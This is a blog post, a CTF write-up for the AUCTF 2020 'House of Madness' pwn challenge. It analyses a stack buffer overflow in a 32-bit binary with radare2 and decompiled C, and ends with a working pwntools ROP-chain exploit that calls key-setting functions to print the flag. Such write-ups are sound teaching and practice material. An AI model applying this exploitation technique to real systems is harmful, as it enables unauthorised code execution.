<!DOCTYPE html>
<html lang="en-us">
    <head>
         
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>AUCTF 2020 Writeup - House of Madness</title>
        
        <style>

    html body {
        font-family: 'Roboto Mono', sans-serif;
        background-color: white;
    }

    :root {
        --accent: #00a6d8;
        --border-width:  5px ;
    }

</style>


<link rel="stylesheet" href="https://raffaeleflorio.github.io/css/main.css">





<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto%20Mono">


 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/solarized-dark.min.css"> 


<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">


<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
 


    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>

     <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/go.min.js"></script>  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/c.min.js"></script>  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/bash.min.js"></script>  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/python.min.js"></script>  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/shell.min.js"></script> 

    <script>hljs.initHighlightingOnLoad();</script>







<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>


<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>


<script>$(document).on('click', function() { $('.collapse').collapse('hide'); })</script>
 <meta name="generator" content="Hugo 0.55.6" />
        

        

        
        
        <script type="text/javascript" async
          src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
        </script>
        
    </head>

    <body>
         
        <nav class="navbar navbar-default navbar-fixed-top">

            <div class="container">

                <div class="navbar-header">

                    <a class="navbar-brand visible-xs" href="#">AUCTF 2020 Writeup - House of Madness</a>

                    <button class="navbar-toggle" data-target=".navbar-collapse" data-toggle="collapse">
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                    </button>

                </div>

                <div class="collapse navbar-collapse">

                    
                        <ul class="nav navbar-nav">
                            
                                <li><a href="/">Home</a></li>
                            
                                <li><a href="/post/">Posts</a></li>
                            
                                <li><a href="/project/">Projects</a></li>
                            
                                <li><a href="/tags/">Tags</a></li>
                            
                        </ul>
                    

                    
                        <ul class="nav navbar-nav navbar-right">
                            
                                <li class="navbar-icon"><a href="https://github.com/raffaeleflorio/"><i class="fa fa-github"></i></a></li>
                            
                                <li class="navbar-icon"><a href="https://www.linkedin.com/in/raffaele-florio-79967919b/"><i class="fa fa-linkedin"></i></a></li>
                            
                                <li class="navbar-icon"><a href="https://instagram.com/r7florio/"><i class="fa fa-instagram"></i></a></li>
                            
                                <li class="navbar-icon"><a href="mailto:raffaeleflorio@protonmail.com"><i class="fa fa-envelope-o"></i></a></li>
                            
                                <li class="navbar-icon"><a href="/key"><i class="fa fa-key"></i></a></li>
                            
                        </ul>
                    

                </div>

            </div>

        </nav>


<main>

    <div class="item">

    
    
    

    
    

    <h4><a href="/post/house-of-madness-auctf2020/">AUCTF 2020 Writeup - House of Madness</a></h4>
    <h5>April 19, 2020</h5>
    
    <a href="https://raffaeleflorio.github.io/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
    
    <a href="https://raffaeleflorio.github.io/tags/writeup"><kbd class="item-tag">writeup</kbd></a>
    
    <a href="https://raffaeleflorio.github.io/tags/pwn"><kbd class="item-tag">pwn</kbd></a>
    
    <a href="https://raffaeleflorio.github.io/tags/x86"><kbd class="item-tag">x86</kbd></a>
    
    <a href="https://raffaeleflorio.github.io/tags/auctf2020"><kbd class="item-tag">auctf2020</kbd></a>
    

</div>


    <br> <div class="text-justify">

<h1 id="intro">Intro</h1>

<p>This is the third pwn challenge. It was solved 100 times and it was worth 897 points.</p>

<p>Description:</p>

<blockquote>
<p>Welcome to the House of Madness. Can you pwn your way to the keys to get the relic?</p>

<p>nc challenges.auctf.com 30012</p>

<p>Note: ASLR is disabled for this challenge</p>
</blockquote>

<p>You could download the binary <a href="/binary/auctf2020/house_of_madness">here</a>.</p>

<pre><code class="language-shell">$ sha256sum ./house_of_madness
15b1a68ae0e1d4eee4f917cc92412d90fd3a4adbb5a55a83b115e0f438baaf93  house_of_madness
</code></pre>

<h1 id="exploitation">Exploitation</h1>

<p>When we launch the program shows a banner and it asks us to make a choice. I tried at this point, without success, a classic buffer overflow.</p>

<p>However if we try to exit the program shows us the direction. Indeed there is a buffer overflow:</p>

<pre><code class="language-shell">$ ./house_of_madness
+------------------------+
|          Welcome       |
|            to          |
|       the House of     |
|          Madness       |
+------------------------+
Can you pwn the house?
1. List Rooms
2. Enter Room
3. Get Current Room Info
4. Quit
Your choice: 4


Wait a minute. This doesn't quit the program... Weird. Hey try entering 'Stephen' in Room 4. I heard the room's magic

1. List Rooms
2. Enter Room
3. Get Current Room Info
4. Quit
Your choice: 2


Choose a room to enter: 4

1. List Rooms
2. Enter Room
3. Get Current Room Info
4. Quit
Your choice: 3


Wow this room is special. It echoes back what you say!
Press Q to exit: Stephen
	You entered 'Stephen'
Welcome to the hidden room! Good Luck
Enter something: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
</code></pre>

<p>So I analyzed the program with checksec and I opened it with radare2:</p>

<pre><code class="language-shell">$ checksec house_of_madness
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
$ r2 -Ad ./house_of_madness
</code></pre>

<p>Then I found these interesting functions:</p>

<pre><code class="language-shell">[r2]&gt; afl
.....
0x56556580    8 261          sym.room4
0x5655686b   16 360          sym.get_flag
.....
</code></pre>

<p>The <code>room4</code> function use <code>gets</code> if <code>Stephen</code> was given as first input. However if we try to call directly <code>get_flag</code>, exploiting the buffer overflow, we got:</p>

<pre><code class="language-shell">$ ./exploit.py
It's not going to be that easy. Come on
</code></pre>

<p>So I decompiled the <code>get_flag</code> function and it prints the flag iff four keys have the correct values:</p>

<pre><code class="language-c">void get_flag(void)

{
  int iVar1;
  char local_60 [64];
  FILE *local_20;
  
  local_20 = fopen(&quot;flag.txt&quot;,&quot;r&quot;);
  if (local_20 == (FILE *)0x0) {
    puts(&quot;\'flag.txt\' missing in the current directory!&quot;);
    exit(0);
  }
  if ((((key1 != '\0') &amp;&amp; (key2 != '\0')) &amp;&amp; (iVar1 = strcmp(key3,&quot;Dormammu&quot;), iVar1 == 0)) &amp;&amp;
     ((key4._4_4_ ^ 0x537472 | (uint)key4 ^ 0x616e6765) == 0)) {
    fgets(local_60,0x40,local_20);
    printf(&quot;Damn you beat the house: %s\n&quot;,local_60);
    return;
  }
  if (((key1 != '\0') &amp;&amp; (key2 != '\0')) &amp;&amp; (iVar1 = strcmp(key3,&quot;Dormammu&quot;), iVar1 == 0)) {
    printf(&quot;Surrender, Stephen. Surrender to the reverser&quot;);
    return;
  }
  if ((key1 == '\0') || (key2 == '\0')) {
    printf(&quot;It\'s not going to be that easy. Come on&quot;);
  }
  else {
    puts(&quot;You think you are ready? You are ready when the relic decides you are ready.&quot;);
  }
  return;
}
</code></pre>

<p>So, to print the flag:</p>

<ul>
<li><code>key1</code> should be different than 0</li>
<li><code>key2</code> should be different than 0</li>
<li><code>key3</code> should point to &ldquo;Dormammu&rdquo;</li>
<li><code>key4[0]</code> should be 0x616e6765</li>
<li><code>key4[1]</code> should be 0x537472</li>
</ul>

<p>Fortunately I rapidly found three useful functions:</p>

<ul>
<li><code>get_key1</code> @ <code>0x565566de</code></li>
<li><code>get_key2</code> @ <code>0x5655676e</code></li>
<li><code>set_key4</code> @ <code>0x565567e9</code></li>
</ul>

<h3 id="get-key1">get_key1</h3>

<p>Iff the first function argument is <code>0xfeedc0de</code> it writes 1 in <code>key1</code>. We can use it.</p>

<h3 id="get-key2">get_key2</h3>

<p>It&rsquo;s a bit more complex than <code>get_key1</code>. Indeed it writes 1 in <code>key2</code>, but it should be called before <code>get_key1</code> and after that <code>key3</code> points to &ldquo;Dormammu&rdquo;.</p>

<p>Given these prerequisites we can use it:</p>

<pre><code class="language-c">void get_key2(void)
{
  int iVar1;
  
  if ((key1 != '\x01') &amp;&amp; (iVar1 = strcmp(key3,&quot;Dormammu&quot;), iVar1 == 0)) {
    key2 = 1;
    return;
  }
  puts(&quot;Need to get the right keys. Reverse the house harder&quot;);
  return;
}
</code></pre>

<h3 id="set-key4">set_key4</h3>

<p>It checks all other keys, then it writes the correct values in <code>key4</code>.</p>

<p>As <code>get_key2</code> if <code>key3</code> points to &ldquo;Dormammu&rdquo; we can use it:</p>

<pre><code class="language-c">void set_key4(void)
{
  int iVar1;
  
  if ((((isInRoom != '\x01') &amp;&amp; (key1 != '\0')) &amp;&amp; (key2 != '\0')) &amp;&amp;
     (iVar1 = strcmp(key3,&quot;Dormammu&quot;), iVar1 == 0)) {
    key4._0_4_ = 0x616e6765;
    key4._4_4_ = 0x537472;
    return;
  }
  puts(&quot;Need to get the right keys. Reverse the house harder&quot;);
  return;
}
</code></pre>

<h3 id="key3">key3</h3>

<p>We need a way to write the correct pointer in <code>key3</code>. It&rsquo;s the last piece of the puzzle.
After some digging I found this function. I analyzed its behavior and it writes in <code>key3</code> a pointer to &ldquo;Dormammu&rdquo;:</p>

<pre><code>[r2]&gt; afl
.....
0x565567cd    1 28           sym.AAsDrwEk
.....
[r2]&gt; pdf @sym.AAsDrwEk
┌ 28: sym.AAsDrwEk ();
│           0x565567cd      55             push ebp
│           0x565567ce      89e5           mov ebp, esp
│           0x565567d0      e848020000     call sym.__x86.get_pc_thunk.ax
│           0x565567d5      052b280000     add eax, 0x282b
│           0x565567da      8d9015e4ffff   lea edx, [eax - 0x1beb]
│           0x565567e0      899040000000   mov dword [eax + 0x40], edx
│           0x565567e6      90             nop
│           0x565567e7      5d             pop ebp
└           0x565567e8      c3             ret
[r2]&gt; ps @0x565567d5 + 0x282b - 0x1beb
Dormammu
[r2]&gt; is~`?v 0x565567d5 + 0x282b + 0x40`
96   0x00003040 0x56559040 GLOBAL OBJ    4        key3
</code></pre>

<h3 id="exploit">Exploit</h3>

<p>So we have all the pieces in place.</p>

<p>This is my exploit:</p>

<pre><code class="language-python">#!/usr/bin/python2

from pwn import *

prog = context.binary = ELF(os.getcwd() + &quot;/challenge&quot;, checksec=False)

if len(sys.argv) &gt; 1:
        host = &quot;challenges.auctf.com&quot;
        port = 30012
        t = remote(host, port)
else:
	t = prog.process()

def init():
	t.recvuntil(&quot;Your choice: &quot;)
        t.sendline(&quot;2&quot;)
        t.recvuntil(&quot;Choose a room to enter: &quot;)
        t.sendline(&quot;4&quot;)
        t.recvuntil(&quot;Your choice: &quot;)
        t.sendline(&quot;3&quot;)
        t.recvuntil(&quot;Press Q to exit: &quot;)
        t.sendline(&quot;Stephen&quot;)
        t.recvuntil(&quot;Enter something: &quot;)
init()

base = 0x56555000
pebx = 0x56556aaa

offset = 28
payload = &quot;P&quot;*offset
payload += pack(prog.symbols[&quot;AAsDrwEk&quot;] + base)
payload += pack(prog.symbols[&quot;get_key2&quot;] + base)
payload += pack(prog.symbols[&quot;get_key1&quot;] + base)
payload += pack(pebx)
payload += pack(0xfeedc0de)
payload += pack(prog.symbols[&quot;set_key4&quot;] + base)
payload += pack(prog.symbols[&quot;get_flag&quot;] + base)

t.sendline(payload)

t.interactive()
t.close()
</code></pre>

<p>And this is the flag:</p>

<pre><code class="language-shell">$ ./exploit.py
.....
Damn you beat the house: auctf{gu3ss_th3_h0us3_1sn't_th4t_m4d}
.....
</code></pre>

<p><img src="/images/auctf2020/house_of_madness/solved.png" alt="house of madness solved banner" /></p>
</div>

    
    

    

        <h4 class="page-header">Related</h4>

         <div class="item">

    
    
    

    
    

    <h4><a href="/post/thanksgiving-dinner-auctf2020/">AUCTF 2020 Writeup - Thanksgiving Dinner</a></h4>
    <h5>April 19, 2020</h5>
    
    <a href="https://raffaeleflorio.github.io/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
    
    <a href="https://raffaeleflorio.github.io/tags/writeup"><kbd class="item-tag">writeup</kbd></a>
    
    <a href="https://raffaeleflorio.github.io/tags/pwn"><kbd class="item-tag">pwn</kbd></a>
    
    <a href="https://raffaeleflorio.github.io/tags/x86"><kbd class="item-tag">x86</kbd></a>
    
    <a href="https://raffaeleflorio.github.io/tags/auctf2020"><kbd class="item-tag">auctf2020</kbd></a>
    

</div>
  <div class="item">

    
    
    

    
    

    <h4><a href="/post/mprotect-urop/">Shellcode Injection - Old but gold</a></h4>
    <h5>October 13, 2019</h5>
    
    <a href="https://raffaeleflorio.github.io/tags/pwn"><kbd class="item-tag">pwn</kbd></a>
    
    <a href="https://raffaeleflorio.github.io/tags/x86"><kbd class="item-tag">x86</kbd></a>
    
    <a href="https://raffaeleflorio.github.io/tags/shellcode"><kbd class="item-tag">shellcode</kbd></a>
    
    <a href="https://raffaeleflorio.github.io/tags/urop"><kbd class="item-tag">urop</kbd></a>
    
    <a href="https://raffaeleflorio.github.io/tags/rop"><kbd class="item-tag">rop</kbd></a>
    

</div>
  <div class="item">

    
    
    

    
    

    <h4><a href="/post/babypwn-hackcon19/">HackCon&#39;19 writeup - babypwn</a></h4>
    <h5>September 4, 2019</h5>
    
    <a href="https://raffaeleflorio.github.io/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
    
    <a href="https://raffaeleflorio.github.io/tags/writeup"><kbd class="item-tag">writeup</kbd></a>
    
    <a href="https://raffaeleflorio.github.io/tags/pwn"><kbd class="item-tag">pwn</kbd></a>
    
    <a href="https://raffaeleflorio.github.io/tags/hackcon2019"><kbd class="item-tag">hackcon2019</kbd></a>
    
    <a href="https://raffaeleflorio.github.io/tags/x86"><kbd class="item-tag">x86</kbd></a>
    

</div>
 

    

    

</main>

        <footer>

            <p class="copyright text-muted">&copy; All rights reserved. Powered by <a href="https://gohugo.io">Hugo</a> and <a href="https://github.com/calintat/minimal">Minimal</a></p>

        </footer>
       
    </body>

</html>

